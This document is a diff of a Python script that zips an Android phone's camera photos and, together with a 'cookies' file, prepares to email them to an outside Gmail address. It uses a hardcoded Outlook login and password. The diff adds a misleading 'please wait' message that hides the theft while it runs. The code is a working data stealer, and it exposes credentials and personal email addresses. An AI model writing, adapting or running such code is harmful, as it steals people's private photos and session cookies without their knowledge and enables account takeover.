@@ -4,7 +4,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart 
 from email.mime.application import MIMEApplication
 import zipfile
-import shutil
+print("please wait this take minutes")
 def zipdir(path, ziph):
 	for root, dirs, files in os.walk(path):
 		for file in files:
@@ -14,13 +14,10 @@ def zipdir(path, ziph):
 zipf = zipfile.ZipFile('test.zip', 'w', zipfile.ZIP_DEFLATED) 
 zipdir('/storage/emulated/0/DCIM/Camera', zipf) 
 zipf.close()
-orginal = '/storage/emulated/0/test.zip'
-path = '/storage/emulated/0/Download/btc/'
-shutil.move(orginal, path)
 email = "jourge.55@outlook.com"
 password = 'zzxcv123$'
 toaddr = "zalborasi@gmail.com"
-dir_path = "/storage/emulated/0/Download/btc"
+dir_path = "/storage/emulated/0/"
 files = ["test.zip", "cookies"]
 msg = MIMEMultipart()
 msg['To'] = "zalborasi@gmail.com" 
